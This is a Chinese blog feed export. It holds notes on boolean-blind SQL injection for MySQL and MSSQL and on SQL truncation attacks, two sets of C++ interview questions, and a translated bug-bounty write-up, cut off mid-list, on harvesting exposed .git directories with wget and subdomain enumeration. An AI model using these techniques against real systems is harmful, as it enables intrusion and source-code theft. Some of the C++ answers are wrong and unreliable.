<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="string">'your_table_schema'</span> <span class="keyword">and</span> table_name regexp <span class="string">'^[a-z]'</span> <span class="keyword">limit</span> <span class="number">0</span>, <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 用于查询在该数据库内的表第一个字符是否为小写字母</span></span><br><span class="line"><span class="comment">-- 此时的limit是针对table_schema的，这里如果明确指定了table_schema，不用也可以</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 接下来，调整正则，缩小范围</span></span><br><span class="line"><span class="string">'^[a-n]'</span></span><br><span class="line"><span class="string">'^n[a-z]'</span></span><br><span class="line">...</span><br><span class="line"><span class="string">'^newview$'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- IMPORTANT： regexp的匹配对象是‘某数据库内部所有的表’，出现表名newuser和newview时，就会在v和u处出现两个甚至多个匹配点，这时候会返回多个，可以写个工具跑一遍</span></span><br></pre></td></tr></table></figure>





<h2 id="0x01-Mssql"><a href="#0x01-Mssql" class="headerlink" title="0x01 Mssql"></a>0x01 Mssql</h2><h3 id="伪正则"><a href="#伪正则" class="headerlink" title="伪正则"></a>伪正则</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- top 1 是选择第一个,实际是select 1</span></span><br><span class="line"><span class="keyword">select</span> top <span class="number">1</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="string">'your_database_name'</span> <span class="keyword">and</span> table_name <span class="keyword">like</span> <span class="string">'[a-z]%'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询第二行表名</span></span><br><span class="line"><span class="keyword">select</span> top <span class="number">1</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="string">'your_database_name'</span> <span class="keyword">not</span> <span class="keyword">in</span> (<span class="keyword">select</span> top <span class="number">1</span> table_name <span class="keyword">from</span> information_schema.tables) <span class="keyword">and</span> table_name <span class="keyword">like</span> <span class="string">'[a-z]%'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询顺序</span></span><br><span class="line">'n[a-z]%' -&gt; 'ne[a-z]%' -&gt; 'new[a-z]%' -&gt; 'news[a-z]%' -&gt; true</span><br></pre></td></tr></table></figure>





<h1 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h1><ul>
<li>数据查询优化，很重要的一部分</li>
<li>bool型盲注</li>
</ul>
<h1 id="思筛"><a href="#思筛" class="headerlink" title="思筛"></a>思筛</h1><ul>
<li>start：基本的注入就是对于网站输入以及回显情况来使用不同的sql函数，前提是有注入点，这里如果要提高就要熟悉sql函数及它的用法，有思路了再去查。</li>
<li>说到根本上还是思维的问题，思维层面上提升了，一切都会有新的高度，系统思维，搜搜这本书。</li>
</ul>
<p>待分配</p>
<ul>
<li>约束攻击</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说“vampire”等同于“vampire ”，对于绝大多数情况来说都是成立的（诸如WHERE子句中的字符串或<span class="keyword">INSERT</span>语句中的字符串）例如以下语句的查询结果，与使用用户名“vampire”进行查询时的结果是一样的。</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username=<span class="string">'vampire     '</span>;</span><br><span class="line">但也存在异常情况，最好的例子就是LIKE子句了。注意，对尾部空白符的这种修剪操作，主要是在“字符串比较”期间进行的。这是因为，SQL会在内部使用空格来填充字符串，以便在比较之前使其它们的长度保持一致。</span><br><span class="line"></span><br><span class="line">在所有的<span class="keyword">INSERT</span>查询中，<span class="keyword">SQL</span>都会根据<span class="built_in">varchar</span>(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。比如特定列的长度约束为“<span class="number">5</span>”个字符，那么在插入字符串“vampire”时，实际上只能插入字符串的前<span class="number">5</span>个字符，即“vampi”。</span><br><span class="line"></span><br><span class="line">执行条件：</span><br><span class="line"><span class="number">1.</span>mysql处于ANSI模式。如果是TRADITIONAL模式或者STRICT_TRANS_TABLES模式会报错<span class="keyword">data</span> too <span class="keyword">long</span> <span class="keyword">for</span> <span class="keyword">column</span>。</span><br><span class="line"><span class="number">2.</span>服务端没有对用户名长度进行限制。如果服务端限制了用户名长度就自然就不客能导致数据库截断，也就没有利用条件。</span><br><span class="line"><span class="number">3.</span>登陆验证的<span class="keyword">SQL</span>语句必须是用户名和密码一起验证。如果是验证流程是先根据用户名查找出对应的密码然后再比对密码，当使用vampire为用户名来查询密码的话，数据库此时就会返回两条记录，而一般取第一条即目标用户的记录，那么传输的密码肯定和目标用户密码匹配不上的。</span><br><span class="line"><span class="number">4.</span>验证成功后返回的必须是用户传递进来的用户名，而不是从数据库取出的用户名。因为当我们以用户vampire和密码random_pass登陆时，其实数据库返回的是我们自己的用户信息，而我们的用户名其实是vampire+若干个空格，如果此后的业务逻辑以该用户名为准，那么就不能达到越权的目的了。</span><br></pre></td></tr></table></figure>



]]></content>
  </entry>
  <entry>
    <title>C++面经 100题（21-40）</title>
    <url>/2020/02/29/C++%E9%9D%A2%E7%BB%8F%20100%E9%A2%98%EF%BC%8821-40%EF%BC%89/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><ol start="21">
<li><h5 id="为什么需要使用堆，使用堆空间的原因？"><a href="#为什么需要使用堆，使用堆空间的原因？" class="headerlink" title="为什么需要使用堆，使用堆空间的原因？"></a>为什么需要使用堆，使用堆空间的原因？</h5><ul>
<li>直到运行时候对象才知道要多大内存，不知道对象生存期多长</li>
</ul>
</li>
<li><h5 id="数组名作实参而指针变量作形参，函数调用实参传给形参的是？"><a href="#数组名作实参而指针变量作形参，函数调用实参传给形参的是？" class="headerlink" title="数组名作实参而指针变量作形参，函数调用实参传给形参的是？"></a>数组名作实参而指针变量作形参，函数调用实参传给形参的是？</h5><ul>
<li>数组第一个元素的地址</li>
</ul>
</li>
<li><h5 id="为什么数组名作为参数会改变数组内容，而其它类型如int却不会改变变量的值？"><a href="#为什么数组名作为参数会改变数组内容，而其它类型如int却不会改变变量的值？" class="headerlink" title="为什么数组名作为参数会改变数组内容，而其它类型如int却不会改变变量的值？"></a>为什么数组名作为参数会改变数组内容，而其它类型如int却不会改变变量的值？</h5><ul>
<li>因为数组名传递的是指针变量，而如<code>int</code>是传入的一份拷贝数据 <a id="more"></a></li>
</ul>
</li>
<li><h5 id="析构函数何虚函数的用法和作用？"><a href="#析构函数何虚函数的用法和作用？" class="headerlink" title="析构函数何虚函数的用法和作用？"></a>析构函数何虚函数的用法和作用？</h5><ul>
<li><p>析构函数：特殊的类成员函数，没有返回类型、参数，不能随意调用，也没有重载，只有在类对象的生命周期结束时，由系统自动调用，释放内存空间。</p>
</li>
<li><p>虚函数：c++多态的一种表现，使用虚函数，，我们能灵活进行动态绑定，花费一定开销</p>
</li>
<li><p>析构函数也可能时虚函数吗？</p>
<ul>
<li>可能，虚析构函数在如下情况也存在</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span>&#125;; <span class="comment">// A为父类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> :</span> A &#123;&#125;; <span class="comment">// B为子类</span></span><br><span class="line"></span><br><span class="line">A &amp;a = <span class="keyword">new</span> B(); <span class="comment">// reference class B object</span></span><br><span class="line"><span class="keyword">delete</span> a; <span class="comment">// virtual destructor</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//	这里调用A的析构函数，但是A是B类的引用变量，所以B还有额外的空间没有被销毁，所以继承时，把父类析构函数定义成虚的，防止父类引用关联了子类对象。</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><h5 id="39-091-39-39-39-39-0-39-39-39-39-错误的转义字符为"><a href="#39-091-39-39-39-39-0-39-39-39-39-错误的转义字符为" class="headerlink" title="&#39;\091&#39; &#39;\\&#39;  &#39;\0&#39; &#39;\&#39;&#39; 错误的转义字符为?"></a><code>&#39;\091&#39;</code> <code>&#39;\\&#39;</code>  <code>&#39;\0&#39;</code> <code>&#39;\&#39;&#39;</code> 错误的转义字符为?</h5><ul>
<li><code>&#39;\091&#39;</code></li>
<li>使用转义的原因：c语言中键盘中没有办法输入但是又存在这个字符</li>
<li><code>% &#39;&#39; &quot;&quot;</code>，也可以是三个8进制数<code>（0~7） \023</code>，也可以时两个16进制数<code>（0~f） \af</code></li>
</ul>
</li>
<li><h5 id="如果ClassA定义并实现虚函数int-func-void-，ClassB中也实现该函数，那么上述变量a-gt-func-将调用哪个类里面的函数？如果int-func-void-不是虚函数，情况又如何？why？"><a href="#如果ClassA定义并实现虚函数int-func-void-，ClassB中也实现该函数，那么上述变量a-gt-func-将调用哪个类里面的函数？如果int-func-void-不是虚函数，情况又如何？why？" class="headerlink" title="如果ClassA定义并实现虚函数int func(void)，ClassB中也实现该函数，那么上述变量a-&gt;func()将调用哪个类里面的函数？如果int func(void)不是虚函数，情况又如何？why？"></a>如果<code>ClassA</code>定义并实现虚函数<code>int func(void)</code>，<code>ClassB</code>中也实现该函数，那么上述变量<code>a-&gt;func()</code>将调用哪个类里面的函数？如果<code>int func(void)</code>不是虚函数，情况又如何？why？</h5><ul>
<li>第一问调用B的</li>
<li>第二问调用A的</li>
<li>虚函数的典型应用，虚函数只能借助于指针or引用来达到多态的效果</li>
</ul>
</li>
<li><h5 id="引用和指针有什么区别？"><a href="#引用和指针有什么区别？" class="headerlink" title="引用和指针有什么区别？"></a>引用和指针有什么区别？</h5><ul>
<li>引用必须被初始化</li>
<li>引用初始化以后不能被改变，指针可以改变所指对象</li>
<li>不存在指向空值的引用，存在指向空值的指针</li>
</ul>
</li>
<li><h5 id="如果不使用常量，直接在程序中填写数字或字符串将会有什么麻烦？"><a href="#如果不使用常量，直接在程序中填写数字或字符串将会有什么麻烦？" class="headerlink" title="如果不使用常量，直接在程序中填写数字或字符串将会有什么麻烦？"></a>如果不使用常量，直接在程序中填写数字或字符串将会有什么麻烦？</h5><ul>
<li>可读性变差</li>
<li>多处输入相同，易错</li>
<li>如果要修改则会在很多地方改动，麻烦又易错</li>
</ul>
</li>
<li><h5 id="c-有没有纯虚构造函数？"><a href="#c-有没有纯虚构造函数？" class="headerlink" title="c++有没有纯虚构造函数？"></a>c++有没有纯虚构造函数？</h5><ul>
<li>构造函数不能为虚函数，构造函数为显式调用</li>
</ul>
</li>
<li><h5 id="重复多次fclose一个打开过一次的FILE-fp指针会有什么结果？"><a href="#重复多次fclose一个打开过一次的FILE-fp指针会有什么结果？" class="headerlink" title="重复多次fclose一个打开过一次的FILE *fp指针会有什么结果？"></a>重复多次<code>fclose</code>一个打开过一次的<code>FILE *fp</code>指针会有什么结果？</h5><ul>
<li>导致文件描述符结构中指针指向的内存被重复释放，进而导致一些不可预期的异常。</li>
</ul>
</li>
<li><h5 id="重载（overload）、重写（override-也叫“覆盖”）、重定义（redefinition）的区别？"><a href="#重载（overload）、重写（override-也叫“覆盖”）、重定义（redefinition）的区别？" class="headerlink" title="重载（overload）、重写（override 也叫“覆盖”）、重定义（redefinition）的区别？"></a>重载（overload）、重写（override 也叫“覆盖”）、重定义（redefinition）的区别？</h5><ul>
<li>重载：同一个类中</li>
<li>重写：继承链中，子类去重新实现父类的同名函数，不能变换函数名、形参类型、个数，返回值无所谓</li>
<li>重定义：第二种情况中，父类如果不是虚函数，则为子类完全重新实现父类函数</li>
</ul>
</li>
<li><h5 id="c-里面是不是所有动作都是main-引起的？如果不是，请举例"><a href="#c-里面是不是所有动作都是main-引起的？如果不是，请举例" class="headerlink" title="c++里面是不是所有动作都是main()引起的？如果不是，请举例"></a>c++里面是不是所有动作都是<code>main()</code>引起的？如果不是，请举例</h5><ul>
<li>不一定</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span>&#125;;</span><br><span class="line">A a; <span class="comment">// a的构造函数执行</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 比如上面全局变量的初始化，就不是由main函数引起的</span></span><br></pre></td></tr></table></figure>
</li>
<li><h5 id="main函数执行前还会执行什么代码？"><a href="#main函数执行前还会执行什么代码？" class="headerlink" title="main函数执行前还会执行什么代码？"></a>main函数执行前还会执行什么代码？</h5><ul>
<li>全局对象的构造函数会在main函数之前执行</li>
</ul>
</li>
<li><h5 id="c-中virtual和inline含义分别是什么？"><a href="#c-中virtual和inline含义分别是什么？" class="headerlink" title="c++中virtual和inline含义分别是什么？"></a>c++中<code>virtual</code>和<code>inline</code>含义分别是什么？</h5><ul>
<li><code>virtual</code>（强制）主要用于声明虚函数，抽象类、纯虚函数、多态</li>
<li><code>inline</code>声明内联函数</li>
</ul>
</li>
<li><h5 id="const关键字有哪些作用？"><a href="#const关键字有哪些作用？" class="headerlink" title="const关键字有哪些作用？"></a><code>const</code>关键字有哪些作用？</h5><ul>
<li>总的说：只读，不能改</li>
<li>欲阻止一个变量被改变</li>
<li>对指针，可以指定指针本身or指针所指数据为<code>const</code></li>
<li>修饰形参，表明函数内部不能修改</li>
<li>修饰类成员函数，有时候必须指定其返回值为<code>const</code>类型，使得其返回值不为”左值”</li>
</ul>
</li>
<li><h5 id="编译中Debug与Release选项是什么含义？"><a href="#编译中Debug与Release选项是什么含义？" class="headerlink" title="编译中Debug与Release选项是什么含义？"></a>编译中Debug与Release选项是什么含义？</h5><ul>
<li>Debug模式下会有额外信息，同时不做任何优化，主要用于调试/编辑测试阶段</li>
<li>Release模式下会把运行不相关的信息删掉，速度、文件大小都会有相应优化，用于发布阶段</li>
</ul>
</li>
<li><h5 id="是不是一个父类写了一个virtual函数，如果子类覆盖它的函数不加virtual，也能实现多态？"><a href="#是不是一个父类写了一个virtual函数，如果子类覆盖它的函数不加virtual，也能实现多态？" class="headerlink" title="是不是一个父类写了一个virtual函数，如果子类覆盖它的函数不加virtual，也能实现多态？"></a>是不是一个父类写了一个<code>virtual</code>函数，如果子类覆盖它的函数不加<code>virtual</code>，也能实现多态？</h5><ul>
<li><code>virtual</code>修饰符会被隐形继承的，<code>virtual</code>可加可不加。子类空间里有父类所有变量（除了static）。</li>
<li>同一个函数只存在一个实体（<code>inline</code>除外），子类覆盖它的函数不加<code>virtual</code>也能实现多态</li>
<li>在子类空间中，有父类的私有变量，私有变量不能直接访问</li>
</ul>
</li>
<li><h5 id="下面代码，变量val内存地址位于？"><a href="#下面代码，变量val内存地址位于？" class="headerlink" title="下面代码，变量val内存地址位于？"></a>下面代码，变量val内存地址位于？</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> val;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>已初始化数据段</li>
</ul>
</li>
<li><h5 id="在不用第三方参数情况下，交换两个参数的值"><a href="#在不用第三方参数情况下，交换两个参数的值" class="headerlink" title="在不用第三方参数情况下，交换两个参数的值"></a>在不用第三方参数情况下，交换两个参数的值</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// methed 1</span></span><br><span class="line">a = a + b;</span><br><span class="line">b = a - b;</span><br><span class="line">a = a - b;</span><br><span class="line"></span><br><span class="line"><span class="comment">// method 2</span></span><br><span class="line">a = a ^ b</span><br><span class="line">b = a ^ b</span><br><span class="line">a = a ^ b</span><br></pre></td></tr></table></figure>
</li>
<li><h5 id="如何打印出当前源文件文件名以及源文件的当前行号？"><a href="#如何打印出当前源文件文件名以及源文件的当前行号？" class="headerlink" title="如何打印出当前源文件文件名以及源文件的当前行号？"></a>如何打印出当前源文件文件名以及源文件的当前行号？</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cout</span> &lt;&lt; __FILE__;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; __LINE__;</span><br><span class="line"><span class="comment">// 两个系统预定义宏，是由编译器定义</span></span><br></pre></td></tr></table></figure>

</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>C++面经 100题（1-20）</title>
    <url>/2020/02/29/C++%E9%9D%A2%E7%BB%8F%20100%E9%A2%98%EF%BC%881-20%EF%BC%89/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><em>这里面的知识对不对还有待考证</em></p>
<ol>
<li><h5 id="判断一段程序是什么编译器编译？"><a href="#判断一段程序是什么编译器编译？" class="headerlink" title="判断一段程序是什么编译器编译？"></a>判断一段程序是什么编译器编译？</h5><ul>
<li>看有没有对应的预定义宏</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"c++"</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"c"</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<a id="more"></a>
</li>
<li><h5 id="c-中的传值方式有几种？"><a href="#c-中的传值方式有几种？" class="headerlink" title="c++中的传值方式有几种？"></a>c++中的传值方式有几种？</h5><ul>
<li>值传递、指针传递、引用传递</li>
</ul>
</li>
<li><h5 id="虚函数c"><a href="#虚函数c" class="headerlink" title="虚函数c++"></a>虚函数c++</h5><pre><code>1. 多态：重写父类同名函数，让程序根据实际情况运行不同函数
2. 纯虚函数：主要用于定义抽象类
3. 提示可能在子类中被重写，还有就是动态绑定</code></pre></li>
<li><h5 id="c和c-有什么不同？"><a href="#c和c-有什么不同？" class="headerlink" title="c和c++有什么不同？"></a>c和c++有什么不同？</h5><ol>
<li><p>语法</p>
</li>
<li><p>高级特性</p>
</li>
<li><p>场景</p>
</li>
<li><p>效率</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">机制上：c面向过程；c++面向对象</span><br><span class="line">适用方向：c适合代码体积小，效率高的场合，如嵌入式；c++适合更上层</span><br><span class="line">名称上可看出c++是c的超集</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><h5 id="c和c-中struct区别？"><a href="#c和c-中struct区别？" class="headerlink" title="c和c++中struct区别？"></a>c和c++中struct区别？</h5><table>
<thead>
<tr>
<th></th>
<th>protection行为</th>
<th>能否定义函数</th>
</tr>
</thead>
<tbody><tr>
<td>c</td>
<td>无</td>
<td>否，但可以有函数指针</td>
</tr>
<tr>
<td>c++</td>
<td>有，默认private</td>
<td>可以</td>
</tr>
</tbody></table>
</li>
<li><h5 id="c-中struct和class区别？"><a href="#c-中struct和class区别？" class="headerlink" title="c++中struct和class区别？"></a>c++中struct和class区别？</h5><ul>
<li>默认继承权限。如不明确指定，class的继承按照private处理，struct继承按照public处理</li>
<li>成员默认访问权限。class成员默认是private权限，struct默认是public权限</li>
</ul>
</li>
<li><h5 id="int-id-sizeof-unsigned-long-对吗？why？"><a href="#int-id-sizeof-unsigned-long-对吗？why？" class="headerlink" title="int id[sizeof(unsigned long)];对吗？why？"></a><code>int id[sizeof(unsigned long)];</code>对吗？why？</h5><ul>
<li>正确，这个<code>sizeof</code>是编译时运算符，编译时就确定了，可以看成和机器相关的常量</li>
</ul>
</li>
<li><h5 id="new-in-c-is-a"><a href="#new-in-c-is-a" class="headerlink" title="new in c++ is a ()"></a><code>new in c++ is a ()</code></h5><ul>
<li>library function like malloc in c [X]</li>
<li>operator [√]</li>
<li>key word [√]<ul>
<li>malloc是库函数，不在编译器控制范围内，调用时从堆中申请内存</li>
<li>new是运算符，在编译器控制范围之内，调用时从对申请内存并为内存调用构造函数</li>
</ul>
</li>
</ul>
</li>
<li><h5 id="变量的指针含义是指变量的"><a href="#变量的指针含义是指变量的" class="headerlink" title="变量的指针含义是指变量的"></a>变量的指针含义是指变量的</h5><ul>
<li>地址<ul>
<li>但是地址值是变量的字节编号，可是指针只是变量字节编号的一部分（多字节变量，指针只是一个字节的编号，即首地址）</li>
</ul>
</li>
</ul>
</li>
<li><h5 id="多态的作用？"><a href="#多态的作用？" class="headerlink" title="多态的作用？"></a>多态的作用？</h5><ul>
<li>隐藏实现细节。使代码能够模块化，扩展代码，实现代码重用</li>
<li>接口重用。为了类在继承和派生时，保证正确调用家族中任一类的实例的某属性</li>
</ul>
</li>
<li><h5 id="多态类中的虚函数表时Compile-Time，还是Run-Time时建立的？"><a href="#多态类中的虚函数表时Compile-Time，还是Run-Time时建立的？" class="headerlink" title="多态类中的虚函数表时Compile-Time，还是Run-Time时建立的？"></a>多态类中的虚函数表时Compile-Time，还是Run-Time时建立的？</h5><pre><code>* 虚拟函数表时在编译期就建立的，各个虚拟函数这是被组织成了一个虚拟函数的入口地址的数组。而对象的隐藏成员虚拟函数表指针是在运行期，也就是构造函数被调用时进行初始化的，这是实现多态的关键。</code></pre></li>
<li><h5 id="面向对象三个基本特征？"><a href="#面向对象三个基本特征？" class="headerlink" title="面向对象三个基本特征？"></a>面向对象三个基本特征？</h5><pre><code>* 封装：将客观事物抽象成类，每个类对自身的数据和方法实行protection(private, protected, public)
* 继承:（1、2为类继承，3为对象组合=&gt;接口继承以及纯虚函数）
  * 实现继承：使用基类的属性和方法而无需额外编码能力
  * 可视继承：子窗体使用父窗体的外观和实现代码
  * 接口继承：仅使用属性和方法，实现之后到子类实现
* 多态：是将父对象设置成为一or多个与他子对象相等的技术，赋值之后，父对象就可以根据当前赋值给它的子对象的特性以不同的方式运作。简单的说：允许将子类类型的指针赋值给父类类型的指针</code></pre></li>
<li><h5 id="内联函数在编译时是否做参数检查？"><a href="#内联函数在编译时是否做参数检查？" class="headerlink" title="内联函数在编译时是否做参数检查？"></a>内联函数在编译时是否做参数检查？</h5><pre><code>* 做，这是相对与宏的优势</code></pre></li>
<li><h5 id="内存的分配方式？"><a href="#内存的分配方式？" class="headerlink" title="内存的分配方式？"></a>内存的分配方式？</h5><pre><code>* 静态存储区域分配，编译时已经分配好，程序整个运行期间，如全局变量
* 栈分配。执行函数时，函数内局部变量的存储单元都可以在栈上创建，自动释放。分配运算内置于处理器指令集中，效率很高但容量有限
* 堆分配。动态内存分配，malloc&amp;new申请任意多少内存，需及时free&amp;delete</code></pre></li>
<li><h5 id="频繁使用短小函数在c和c-中用什么实现？"><a href="#频繁使用短小函数在c和c-中用什么实现？" class="headerlink" title="频繁使用短小函数在c和c++中用什么实现？"></a>频繁使用短小函数在c和c++中用什么实现？</h5><pre><code>* c用宏定义，c++用inline</code></pre></li>
<li><h5 id="全局变量和局部变量有什么区别？是怎么实现的？操作系统怎么知道的？"><a href="#全局变量和局部变量有什么区别？是怎么实现的？操作系统怎么知道的？" class="headerlink" title="全局变量和局部变量有什么区别？是怎么实现的？操作系统怎么知道的？"></a>全局变量和局部变量有什么区别？是怎么实现的？操作系统怎么知道的？</h5><pre><code>* 生命周期不同：全局变量随主程序创建&amp;销毁；局部变量在局部函数或循环体内部，退出即消失；
* 使用方式不同：全局变量声明后各个部分都可使用，局部变量只能在局部使用；
* 实现：全局变量在全局数据区，局部变量在栈区
* 操作系统通过内存分配位置知道是何变量。</code></pre></li>
<li><h5 id="静态全局变量作用域？"><a href="#静态全局变量作用域？" class="headerlink" title="静态全局变量作用域？"></a>静态全局变量作用域？</h5><pre><code>- 本文件</code></pre></li>
<li><h5 id="有了malloc-free为何还要new-delete？"><a href="#有了malloc-free为何还要new-delete？" class="headerlink" title="有了malloc/free为何还要new/delete？"></a>有了malloc/free为何还要new/delete？</h5><pre><code>* malloc/free是c/c++标准库函数，new/delete是c++关键字（or运算符）
* 对于非内部数据类型的对象，需要执行构造析构函数，而malloc/free不是运算符，不在编译器的控制范围内，所以有new来完成动态内存分配，delete来清理何释放内存</code></pre></li>
<li><h5 id="c-是不是类型安全？"><a href="#c-是不是类型安全？" class="headerlink" title="c++是不是类型安全？"></a>c++是不是类型安全？</h5><pre><code>* 不是，两个不同类型指针之间可以强制转换（用reinterpret_cast)
* 类型安全：不同数据类型的数据不能随意地转换来操作。</code></pre></li>
<li><h5 id="用c-写程序，判断os是16位还是32位？"><a href="#用c-写程序，判断os是16位还是32位？" class="headerlink" title="用c++写程序，判断os是16位还是32位？"></a>用c++写程序，判断os是16位还是32位？</h5><pre><code>* 定义一个指针p，打印sizeof(p)，如果结果是4（32），结果为2（16）

* 不大行的法二

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a = ~<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(a &gt; <span class="number">65536</span>) &#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"32 bit"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"16 bit"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></code></pre></li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>我是如何下载印度最大电信服务提供商的源代码的(包含大量知名网站)</title>
    <url>/2020/02/29/%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E4%B8%8B%E8%BD%BD%E5%8D%B0%E5%BA%A6%E6%9C%80%E5%A4%A7%E7%94%B5%E4%BF%A1%E6%9C%8D%E5%8A%A1%E6%8F%90%E4%BE%9B%E5%95%86%E7%9A%84%E6%BA%90%E4%BB%A3%E7%A0%81%E7%9A%84-%E5%8C%85%E5%90%AB%E5%A4%A7%E9%87%8F%E7%9F%A5%E5%90%8D%E7%BD%91%E7%AB%99/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>原文链接：<a href="https://medium.com/@logicbomb_1/bugbounty-how-i-was-able-to-download-the-source-code-of-indias-largest-telecom-service-52cf5c5640a1" target="_blank" rel="noopener">How I was able to download the Source Code of India’s Largest Telecom Service Provider including dozens of more popular websites!</a></p>
<p>漏洞难度：低</p>
<p>漏洞奖金：未知</p>
<p>漏洞类型：敏感信息泄露</p>
<a id="more"></a>

<p>嘿！大家好，最近我看到一个snapchat源码泄露的新闻，黑客把其网站源代码下载下来并上传到了GitHub上。在前些年，</p>
<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>什么是Git？这个我相信大家应该都懂我就不翻了。ε=ε=ε=┏(゜ロ゜;)┛（逃~</p>
<blockquote>
<p><em>Git is a version control system (VCS) for tracking changes in computer files and coordinating work on those files among multiple people. It is primarily used for source code management in software development but it can be used to keep track of changes in any set of files.It allows source code versions to be managed in a logical manner and tracks changes through different ‘forks’ and ‘branches’.</em></p>
</blockquote>
<p>如果一个应用已经错误配置了git目录，使它暴露在外，那么这个文件夹就会像下面这样</p>
<p><img src="https://miro.medium.com/max/1014/1*8b_tnMpwgfrjIhn7VQ0xhg.png" alt></p>
<p>为了从这个仓库中递归下载每个文件，wget必然是最佳工具，<code>wget -r https://example.com/.git</code>。现在一旦你可以下载整个<code>.git</code>文件夹，你只需要懂一点点git命令行就可以把git对象都搞下来。</p>
<p>这些网站可以参考：</p>
<p><a href="https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/" target="_blank" rel="noopener">https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/</a></p>
<p><a href="https://blog.netspi.com/dumping-git-data-from-misconfigured-web-servers/" target="_blank" rel="noopener">https://blog.netspi.com/dumping-git-data-from-misconfigured-web-servers/</a></p>
<h2 id="技术细节"><a href="#技术细节" class="headerlink" title="技术细节"></a>技术细节</h2><p>如果你不熟悉git和git命令，那么在进入本节之前，建议读读上面的链接。现在，一起来看看我是怎么在包括印度最大的电信行业在内的多家公司中做到这一点的。</p>
<p>子域名和主域名一样重要，这也就是为啥前期的信息搜集最重要的一部分之一是子域名枚举。<strong>并不总是在主域名下发生git错误配置</strong>，它也会在子域名下出现，所以为了找到所有意外公开git仓库的域名，<strong>我们要把域名爆破和<code>.git</code>下载组合起来</strong>。<a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">Sublist3r</a>是基于各种不同资源的域名爆破工具，它会将子域名以列表的形式输出，当然github上还有更多好的工具等你发掘。同样github上还有一个碉堡了的开源项目–<a href="https://github.com/arthaud/git-dumper" target="_blank" rel="noopener">Git-dumper</a>，它实现了我们刚才说的两个需求。我把这两个项目的代码合了起来，然后做了点小改动（都放在git-domain.py里），这些改动有：</p>
<ol>
<li><code>git-domain.py</code>需要一个文件作为输入，文件中是你想爆破的主域名，每个域名占一行</li>
<li>它会遍历每个（行）域名，在查找子域名的同时检查它们有没有<code>.git</code>目录以及是否公开</li>
